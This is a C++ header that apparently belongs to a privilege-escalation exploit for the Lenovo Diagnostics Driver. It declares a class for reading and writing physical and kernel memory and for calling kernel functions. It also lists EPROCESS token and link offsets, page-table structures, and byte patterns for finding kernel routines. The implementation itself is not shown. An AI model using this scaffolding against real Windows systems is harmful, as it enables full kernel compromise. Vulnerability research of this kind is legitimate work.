/*
Copyright 2022 <COPYRIGHT HOLDER>

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
*/

#pragma once
#include <Windows.h>
#include <winternl.h>
#include <stdio.h>

#pragma comment(lib, "ntdll")

#define IOCTL_PHYS_RD 0x222010
#define IOCTL_PHYS_WR 0x222014

#define SYS_INFO_CLASS_MODULE_INFO 0x0b
#define OFFSET_PS_INITIAL_SYSTEM_PROC 0x00cfb420
#define EPROCESS_TOKEN_OFFSET 0x358
#define EPROCESS_ACTIVE_LINKS_OFFSET 
#define EPROCESS_DIRBASE_OFFSET 0x028

struct CALL_DATA
{
	UINT64 FunctionAddr;
	UINT64 Arg1;
	UINT64 Arg2;
	UINT64 Arg3;
	UINT64 Arg4;
	UINT64 CallResult0;
};

typedef struct SYSTEM_MODULE {
	PVOID  Reserved1;
	PVOID  Reserved2;
	PVOID  ImageBase;
	ULONG  ImageSize;
	ULONG  Flags;
	USHORT Index;
	USHORT NameLength;
	USHORT LoadCount;
	USHORT PathLength;
	CHAR   ImageName[256];
} SYSTEM_MODULE, * PSYSTEM_MODULE;

typedef struct SYSTEM_MODULE_INFORMATION {
	ULONG                ModulesCount;
	SYSTEM_MODULE        Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

typedef struct LDIAG_READ {
	DWORD64 data;
	DWORD64 wLen;
} LDIAG_READ, * PLDIAG_READ;

typedef struct LDIAG_WRITE {
	DWORD64 _where;
	DWORD dwMapSize;
	DWORD dwLo;
	DWORD64 _what_ptr;
} LDIAG_WRITE, * PLDIAG_WRITE;

// https://github.com/ch3rn0byl/CVE-2021-21551/blob/master/CVE-2021-21551/typesndefs.h
typedef struct _FILL_PTE_HIERARCHY
{
	UINT64 PXE = 0;
	UINT64 PPE = 0;
	UINT64 PDE = 0;
	UINT64 PTE = 0;
} FILL_PTE_HIERARCHY, * PFILL_PTE_HIERARCHY;

// https://github.com/ch3rn0byl/CVE-2021-21551/blob/master/CVE-2021-21551/typesndefs.h#L54
typedef union _PAGE_TABLE_ENTRY
{
	struct
	{
		UINT64 Present : 1;					/// bit 0
		UINT64 ReadWrite : 1;				/// bit 1
		UINT64 UserSupervisor : 1;			/// bit 2
		UINT64 PageLevelWriteThrough : 1;	/// bit 3
		UINT64 PageLevelCacheDisable : 1;	/// bit 4
		UINT64 Accessed : 1;				/// bit 5
		UINT64 Dirty : 1;					/// bit 6
		UINT64 PAT : 1;						/// bit 7
		UINT64 Global : 1;					/// bit 8 
		UINT64 CopyOnWrite : 1;				/// bit 9
		UINT64 Ignored : 2;					/// bits 10 - 11
		UINT64 Pfn : 40;					/// bits 12 - (52 - 1)
		UINT64 Reserved : 11;				/// bits 52 - 62
		UINT64 NxE : 1;						/// bit 63
	} flags;
	UINT64 value = 0;
} PAGE_TABLE_ENTRY, * PPAGE_TABLE_ENTRY;

enum PageType {
	UsePte,
	UsePde
};

// Begin pattern matching
#define NOP_RET ((WORD)0xc390)
#define MAXSEARCH_KEBUGCHECKEX 0x300
#define MAXSEARCH_KEBUGCHECK2 0x1100
#define MAXSEARCH_KIMARKBUGCHECKREGIONS 0x200
#define MAXSEARCH_MMGETPHYS 0x200
#define MAXSEARCH_MIGETPHYS 0x200
#define MAXSEARCH_KIMARKBUGCHECKREGIONS 0x200

#define SZ_CALLREL32 5
#define SZ_MOV_REL32 7

static BYTE arrKeBugCheckExPattern[7] = { 0xe8, 0, 0, 0, 0, 0x90, 0xc3 };
static BYTE arrKeBugCheckExMask[7] = { 0, '?', '?', '?', '?', 0, 0 };

static BYTE arrKeBugCheck2Pattern[8] = { 0xe8, 0, 0, 0, 0, 0x48, 0x83, 0x3d };
static BYTE arrKeBugCheck2Mask[8] = { 0, '?', '?', '?', '?', 0, 0, 0 };

static BYTE arrMovRaxPteBasePattern[9] = { 0x48, 0x8b, 0x05, 0, 0, 0, 0, 0x48, 0xc1 };
static BYTE arrMovRaxPteBaseMask[9] = { 0, 0, 0, '?', '?', '?', '?', 0, 0 };

static BYTE arrMmGetPhysPattern[7] = { 0xe8, 0, 0, 0, 0, 0xf7, 0xd8 };
static BYTE arrMmGetPhysMask[7] = { 0, '?', '?', '?', '?', 0, 0 };

static BYTE arrCallMiFillPteHierarchy[8] = { 0xe8, 0, 0, 0, 0, 0x48, 0x8b, 0xce };
static BYTE arrCallMiFillPteHierarchyMask[8] = { 0,'?','?','?','?', 0, 0, 0 };

static BYTE arrMiGetPhysPattern[6] = { 0xe8, 0, 0, 0, 0, 0xeb };
static BYTE arrMiGetPhysMask[6] = { 0, '?', '?', '?', '?', 0 };

static BYTE arrMiVaToPfnPattern[12] = { 0x48, 0xbf, 0, 0, 0, 0, 0, 0, 0, 0, 0x41, 0x8b };
static BYTE arrMiVaToPfnMask[12] = { 0, 0, '?', '?', '?', '?','?', '?', '?', '?', 0, 0 };

static BYTE MiGetPteAddressPattern[] = { 0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x80, 0xF6, 0xFF, 0xFF, 0x48, 0x03, 0xC1 };
static BYTE MiGetPteAddressMask[] = { 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0 };

static BYTE arrMiFillPteHeirarchyPTE[13] = {
	0x49, 0xb8, 0, 0, 0, 0, 0, 0, 0, 0, // mov r8, qwPteBase
	0x49, 0x8b, 0xc0 // mov rax, r8 
};
static BYTE arrMiFillPteHeirarchyPTEMask[13] = { 0, 0, '?', '?', '?', '?','?', '?', '?', '?', 0, 0, 0 };
// end pattern matching

#define OFFSET_EPROCESS_LINKS 0x448
#define OFFSET_EPROCESS_PID 0x440
#define OFFSET_EPROCESS_THREAD_HEAD_LIST 0x5E0

#define OFFSET_ETHREAD_ID 0x480
#define OFFSET_ETHREAD_PREVIOUS_MODE 0x232
#define OFFSET_ETHREAD_LIST_ENTRY 0x4E8

#define OFFSET_MI_GET_PTE_ADDRESS 0x2DDF70

class LenovoMemoryMgr
{
public:
	LenovoMemoryMgr() {};
	~LenovoMemoryMgr() {};

	HANDLE hDevice = 0;
	UINT64 physSwapAddr = 0;
	UINT64 tempSwap = 0;
	UINT64 NtosBase = 0;
	UINT64 PteBase = 0;

	UINT64 FindBase(const char* image_name);

	UINT64 GetPsInitialSystemProc();
	UINT64 GetKernelExport(const char* function_name);
	BOOL SearchEprocessLinksForPid(UINT64 Pid, UINT64 SystemEprocess, PUINT64 lpTargetProcess);

	UINT64 GetPreviousModeAddress();
	UINT64 GetPageTableInfo(UINT64 address, PAGE_TABLE_ENTRY& entry);
	BOOL WritePageTable(UINT64 page_table_address, PAGE_TABLE_ENTRY entry);
	
	BOOL init();
	BOOL teardown();

	const char* strDeviceName = R"(\\.\LenovoDiagnosticsDriver)";
	
	template <typename T>
	BOOL ReadPhysData(_In_ UINT64 address, _Out_ T* data);
	UINT64 CallKernelFunction(_In_ UINT64 address, UINT64 arg1, UINT64 arg2, UINT64 arg3, UINT64 arg4);

	template <typename T>
	BOOL WritePhysData(_In_ UINT64 PhysDest, _In_ T* data);

	template <typename T>
	BOOL ReadVirtData(_In_ UINT64 address, _Out_ T* data);

	template <typename T>
	BOOL WriteVirtData(_In_ UINT64 address, _Out_ T* data);

private:
	PFILL_PTE_HIERARCHY CreatePteHierarchy(UINT64 VirtualAddress);
	UINT64 FindPhysSwapSpace();
	UINT64 GetPteBase();
	UINT64 VtoP(UINT64 va, UINT64 index, PageType p);	
	BOOL SearchPattern(PBYTE patten, PBYTE mask, DWORD dwPatternSize, UINT64 lpBeginSearch, SIZE_T lenSearch, PUINT64 AddressOfPattern);
	PageType GetPageTypeForVirtualAddress(UINT64 VirtAddress, PPAGE_TABLE_ENTRY PageTableEntry);
	UINT64 FindNtosBase();
};

